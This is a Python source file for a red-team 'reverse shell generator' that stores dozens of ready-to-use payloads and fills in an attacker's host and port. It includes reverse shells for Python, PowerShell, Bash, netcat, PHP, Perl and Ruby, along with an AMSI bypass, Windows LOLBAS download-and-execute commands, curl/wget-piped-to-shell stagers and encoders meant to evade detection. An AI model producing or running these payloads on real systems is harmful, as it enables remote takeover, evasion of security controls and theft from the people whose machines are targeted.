#!/usr/bin/env python3
"""
Elite Reverse Shell Generator
Professional-grade payload generation for Red Team operations
Supports multiple categories and encoders
"""

import base64
import random
import string
from polymorphic_obfuscator import PolymorphicObfuscator


class EliteRevShellGenerator:
    """
    Professional payload generator with multiple categories and obfuscation methods
    """
    
    def __init__(self):
        self.payloads = self._initialize_payloads()
        self.obfuscator = PolymorphicObfuscator(obfuscation_level='high')
        self.encoders = {
            'None': self._encode_none,
            'Base64': self._encode_base64,
            'URL': self._encode_url,
            'Hex': self._encode_hex,
            'PowerShell Base64': self._encode_powershell_base64,
            'Polymorphic Python': self._encode_polymorphic_python,
            'Polymorphic PowerShell': self._encode_polymorphic_powershell,
            'Polymorphic C#': self._encode_polymorphic_csharp,
        }
    
    def _initialize_payloads(self):
        """Initialize all payload templates"""
        return {
            'C2PY Agents': {
                'Advanced Python': [
                    # Advanced C2PY agent with XOR encryption
                    '''import socket,subprocess,os,json,base64
def xor_encrypt_decrypt(data, key="SecureKey2024!!!"):
    if isinstance(data, str):
        data_bytes = data.encode('utf-8', errors='replace')
    else:
        data_bytes = data
    if isinstance(key, str):
        key_bytes = key.encode('utf-8', errors='replace')
    else:
        key_bytes = key
    result = bytearray()
    for i in range(len(data_bytes)):
        result.append(data_bytes[i] ^ key_bytes[i % len(key_bytes)])
    return bytes(result)

s=socket.socket()
s.connect(("{LHOST}",{LPORT}))
while True:
    enc_cmd=s.recv(4096)
    if not enc_cmd:break
    cmd=xor_encrypt_decrypt(enc_cmd).decode()
    if cmd.lower()=='exit':break
    try:
        output=subprocess.check_output(cmd,shell=True,stderr=subprocess.STDOUT)
    except Exception as e:
        output=str(e).encode()
    enc_out=xor_encrypt_decrypt(output)
    s.sendall(enc_out)
s.close()''',
                    
                    # Persistent Python agent
                    '''import socket,subprocess,os,time,json,base64
def xor_encrypt_decrypt(data, key="SecureKey2024!!!"):
    if isinstance(data, str):
        data_bytes = data.encode('utf-8', errors='replace')
    else:
        data_bytes = data
    if isinstance(key, str):
        key_bytes = key.encode('utf-8', errors='replace')
    else:
        key_bytes = key
    result = bytearray()
    for i in range(len(data_bytes)):
        result.append(data_bytes[i] ^ key_bytes[i % len(key_bytes)])
    return bytes(result)

while True:
    try:
        s=socket.socket()
        s.connect(("{LHOST}",{LPORT}))
        while True:
            enc_cmd=s.recv(4096)
            if not enc_cmd:break
            cmd=xor_encrypt_decrypt(enc_cmd).decode()
            if cmd.lower()=='exit':break
            try:
                output=subprocess.check_output(cmd,shell=True,stderr=subprocess.STDOUT)
            except Exception as e:
                output=str(e).encode()
            enc_out=xor_encrypt_decrypt(output)
            s.sendall(enc_out)
        s.close()
    except:
        time.sleep(30)
        continue
    break''',
                ],
                'Legacy Compatible': [
                    # Simple Python reverse shell
                    '''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])''',
                    
                    # Python with error handling
                    '''import socket,subprocess;s=socket.socket();s.connect(("{LHOST}",{LPORT}));
while 1:
    cmd=s.recv(1024).decode();
    if cmd=='exit':break
    try:o=subprocess.check_output(cmd,shell=True,stderr=subprocess.STDOUT)
    except Exception as e:o=str(e).encode()
    s.sendall(o)''',
                ],
            },
            'PowerShell': {
                'Advanced': [
                    # AMSI bypass + PowerShell reverse shell
                    '''$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$b=$a.GetField('amsiInitFailed','NonPublic,Static');$b.SetValue($null,$true);$c=New-Object Net.Sockets.TCPClient('{LHOST}',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$o2=$o+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($o2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()''',
                    
                    # Encoded PowerShell with persistence
                    '''$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()''',
                    
                    # Process injection PowerShell
                    '''$code = {{
                        $client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});
                        $stream = $client.GetStream();
                        [byte[]]$bytes = 0..65535|%{{0}};
                        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
                            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
                            $sendback = (iex $data 2>&1 | Out-String );
                            $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
                            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
                            $stream.Write($sendbyte,0,$sendbyte.Length);
                            $stream.Flush()
                        }};
                        $client.Close()
                    }};
                    Start-Job -ScriptBlock $code''',
                ],
                'Simple': [
                    # One-liner PowerShell
                    '''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"''',
                ],
            },
            'Bash': {
                'Standard': [
                    # Bash TCP reverse shell
                    '''bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1''',
                    
                    # Bash with retry
                    '''bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' || bash -c '0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196' ''',
                ],
                'Advanced': [
                    # Bash with persistence
                    '''while true; do bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1; sleep 30; done &''',
                    
                    # Bash with file descriptor
                    '''0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196''',
                ],
            },
            'Netcat': {
                'Standard': [
                    '''nc -e /bin/sh {LHOST} {LPORT}''',
                    '''nc -e /bin/bash {LHOST} {LPORT}''',
                    '''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f''',
                ],
                'OpenBSD': [
                    '''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f''',
                ],
            },
            'PHP': {
                'Standard': [
                    '''php -r '$sock=fsockopen("{LHOST}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");' ''',
                    '''php -r '$sock=fsockopen("{LHOST}",{LPORT});shell_exec("/bin/sh -i <&3 >&3 2>&3");' ''',
                ],
                'Advanced': [
                    '''php -r '$sock=fsockopen("{LHOST}",{LPORT});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);' ''',
                ],
            },
            'Perl': {
                'Standard': [
                    '''perl -e 'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' ''',
                ],
                'Alternative': [
                    '''perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{LHOST}:{LPORT}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' ''',
                ],
            },
            'Ruby': {
                'Standard': [
                    '''ruby -rsocket -e'f=TCPSocket.open("{LHOST}",{LPORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ''',
                ],
                'Alternative': [
                    '''ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{LHOST}","{LPORT}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end' ''',
                ],
            },
            'LOLBAS (Windows)': {
                'RegSvr32 (SCT)': [
                    # RegSvr32 with remote SCT file
                    '''regsvr32.exe /s /n /u /i:http://{LHOST}:8080/payload.sct scrobj.dll''',
                    # RegSvr32 with local SCT
                    '''regsvr32.exe /s /n /u /i:payload.sct scrobj.dll''',
                ],
                'MSHTA': [
                    # MSHTA with remote HTA
                    '''mshta.exe http://{LHOST}:8080/payload.hta''',
                    # MSHTA with VBScript
                    '''mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://{LHOST}:8080/payload.ps1')"":Close")''',
                    # MSHTA JavaScript
                    '''mshta.exe javascript:a=GetObject("script:http://{LHOST}:8080/payload.sct").Exec();close();''',
                ],
                'Rundll32': [
                    # Rundll32 with JavaScript
                    '''rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://{LHOST}:8080/payload.ps1')")''',
                    # Rundll32 with URL
                    '''rundll32.exe url.dll,OpenURL http://{LHOST}:8080/payload.hta''',
                    # Rundll32 DLL execution
                    '''rundll32.exe \\\\{LHOST}\\share\\payload.dll,EntryPoint''',
                ],
                'MSBuild': [
                    # MSBuild with remote XML
                    '''C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe http://{LHOST}:8080/payload.xml''',
                    # MSBuild with local XML
                    '''C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe payload.xml''',
                ],
                'InstallUtil': [
                    # InstallUtil with payload DLL
                    '''C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll''',
                ],
                'Certutil': [
                    # Certutil download and execute
                    '''certutil.exe -urlcache -split -f http://{LHOST}:8080/payload.exe payload.exe && payload.exe''',
                    # Certutil with PowerShell
                    '''certutil.exe -urlcache -split -f http://{LHOST}:8080/payload.ps1 payload.ps1 && powershell -exec bypass -file payload.ps1''',
                ],
                'BITSAdmin': [
                    # BITSAdmin download and execute
                    '''bitsadmin /transfer myDownload /priority high http://{LHOST}:8080/payload.exe %TEMP%\\payload.exe && %TEMP%\\payload.exe''',
                ],
                'WScript/CScript': [
                    # WScript with remote VBS
                    '''wscript.exe http://{LHOST}:8080/payload.vbs''',
                    # CScript with remote VBS
                    '''cscript.exe http://{LHOST}:8080/payload.vbs''',
                    # WScript with inline VBScript
                    '''wscript.exe /e:vbscript -c "CreateObject(""WScript.Shell"").Run ""powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://{LHOST}:8080/payload.ps1')"""''',
                ],
            },
            'Staged Payloads': {
                'PowerShell Downloader': [
                    # IEX download
                    '''powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://{LHOST}:8080/payload.ps1')"''',
                    # Invoke-WebRequest
                    '''powershell.exe -NoP -NonI -W Hidden -Command "IWR -Uri http://{LHOST}:8080/payload.ps1 -UseBasicParsing | IEX"''',
                    # Encoded downloader
                    '''powershell.exe -NoP -NonI -W Hidden -Enc <BASE64_ENCODED_DOWNLOAD_COMMAND>''',
                ],
                'Bash Downloader': [
                    # Curl + bash
                    '''curl -s http://{LHOST}:8080/payload.sh | bash''',
                    # Wget + bash
                    '''wget -qO- http://{LHOST}:8080/payload.sh | bash''',
                    # Python downloader
                    '''python -c "import urllib;exec(urllib.urlopen('http://{LHOST}:8080/payload.py').read())"''',
                    # Python3 downloader
                    '''python3 -c "import urllib.request;exec(urllib.request.urlopen('http://{LHOST}:8080/payload.py').read())"''',
                ],
            },
        }
    
    def get_categories(self):
        """Return all available categories"""
        return list(self.payloads.keys())
    
    def get_subcategories(self, category):
        """Return subcategories for a given category"""
        if category in self.payloads:
            return list(self.payloads[category].keys())
        return []
    
    def get_payloads(self, category, subcategory):
        """Return all payloads for a given category and subcategory"""
        if category in self.payloads and subcategory in self.payloads[category]:
            return self.payloads[category][subcategory]
        return []
    
    def get_available_encoders(self, category, subcategory):
        """Return available encoders for a category"""
        return list(self.encoders.keys())
    
    def generate_payload(self, category, subcategory, payload_index, lhost, lport, encoder='None'):
        """Generate a payload with the specified parameters"""
        if category not in self.payloads:
            raise ValueError(f"Invalid category: {category}")
        
        if subcategory not in self.payloads[category]:
            raise ValueError(f"Invalid subcategory: {subcategory}")
        
        payloads = self.payloads[category][subcategory]
        
        if payload_index >= len(payloads):
            raise ValueError(f"Invalid payload index: {payload_index}")
        
        payload = payloads[payload_index]
        payload = payload.replace('{LHOST}', lhost).replace('{LPORT}', str(lport))
        
        # Apply encoder
        if encoder in self.encoders:
            payload = self.encoders[encoder](payload, category)
        
        return payload
    
    def generate_listener_command(self, lhost, lport, listener_type):
        """Generate listener command for the specified type"""
        commands = {
            'c2py': f'python3 c2_gui.py  # Start listener on {lhost}:{lport}',
            'netcat': f'nc -lvnp {lport}',
            'ncat': f'ncat -lvnp {lport}',
            'socat': f'socat TCP-LISTEN:{lport},reuseaddr,fork -',
            'metasploit': f'use exploit/multi/handler\nset PAYLOAD python/meterpreter/reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nexploit',
        }
        
        return commands.get(listener_type, f'nc -lvnp {lport}')
    
    # Encoder methods
    def _encode_none(self, payload, category):
        """No encoding"""
        return payload
    
    def _encode_base64(self, payload, category):
        """Base64 encode the payload"""
        if 'PowerShell' in category:
            # For PowerShell, encode and wrap in decode command
            encoded = base64.b64encode(payload.encode('utf-16-le')).decode()
            return f'powershell -enc {encoded}'
        else:
            # Generic base64
            encoded = base64.b64encode(payload.encode()).decode()
            return f'echo {encoded} | base64 -d | sh'
    
    def _encode_url(self, payload, category):
        """URL encode the payload"""
        import urllib.parse
        return urllib.parse.quote(payload)
    
    def _encode_hex(self, payload, category):
        """Hex encode the payload"""
        hex_encoded = payload.encode().hex()
        if 'Bash' in category:
            return f'echo {hex_encoded} | xxd -r -p | bash'
        return hex_encoded
    
    def _encode_powershell_base64(self, payload, category):
        """PowerShell-specific base64 encoding"""
        encoded = base64.b64encode(payload.encode('utf-16-le')).decode()
        return f'powershell.exe -NoP -NonI -W Hidden -Enc {encoded}'
    
    def _encode_polymorphic_python(self, payload, category):
        """Generate polymorphic Python agent"""
        # Extract LHOST and LPORT from payload
        import re
        lhost_match = re.search(r'"([^"]+)",\s*(\d+)', payload)
        if lhost_match:
            lhost = lhost_match.group(1)
            lport = int(lhost_match.group(2))
        else:
            # Fallback to defaults
            lhost = "127.0.0.1"
            lport = 4444
        
        result = self.obfuscator.obfuscate_python("", lhost, lport)
        return result['code']
    
    def _encode_polymorphic_powershell(self, payload, category):
        """Generate polymorphic PowerShell agent"""
        import re
        # Extract LHOST and LPORT
        lhost_match = re.search(r'"([^"]+)",\s*(\d+)', payload)
        if lhost_match:
            lhost = lhost_match.group(1)
            lport = int(lhost_match.group(2))
        else:
            lhost = "127.0.0.1"
            lport = 4444
        
        result = self.obfuscator.obfuscate_powershell(lhost, lport)
        return result['code']
    
    def _encode_polymorphic_csharp(self, payload, category):
        """Generate polymorphic C# agent"""
        import re
        # Extract LHOST and LPORT
        lhost_match = re.search(r'"([^"]+)",\s*(\d+)', payload)
        if lhost_match:
            lhost = lhost_match.group(1)
            lport = int(lhost_match.group(2))
        else:
            lhost = "127.0.0.1"
            lport = 4444
        
        result = self.obfuscator.obfuscate_csharp(lhost, lport)
        return result['code']


if __name__ == "__main__":
    # Test the generator
    gen = EliteRevShellGenerator()
    print("Categories:", gen.get_categories())
    print("C2PY subcategories:", gen.get_subcategories("C2PY Agents"))
    
    # Generate a sample payload
    payload = gen.generate_payload("C2PY Agents", "Advanced Python", 0, "192.168.1.100", 4444)
    print("\nSample payload:")
    print(payload)
